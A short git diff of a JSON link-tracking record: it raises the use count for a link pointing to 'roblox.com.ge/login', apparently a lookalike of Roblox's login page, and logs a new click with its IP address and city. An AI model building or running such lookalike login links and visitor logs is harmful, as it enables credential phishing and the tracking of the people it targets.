@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1288,
+    "useCount": 1289,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10448,6 +10448,14 @@
         "city": "Stretford",
         "flag": "🇬🇧",
         "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777369761853,
+        "ip": "119.2.118.22",
+        "country": "Bhutan",
+        "city": "Thimphu",
+        "flag": "🇧🇹",
+        "countryCode": "BT"
       }
     ]
   },
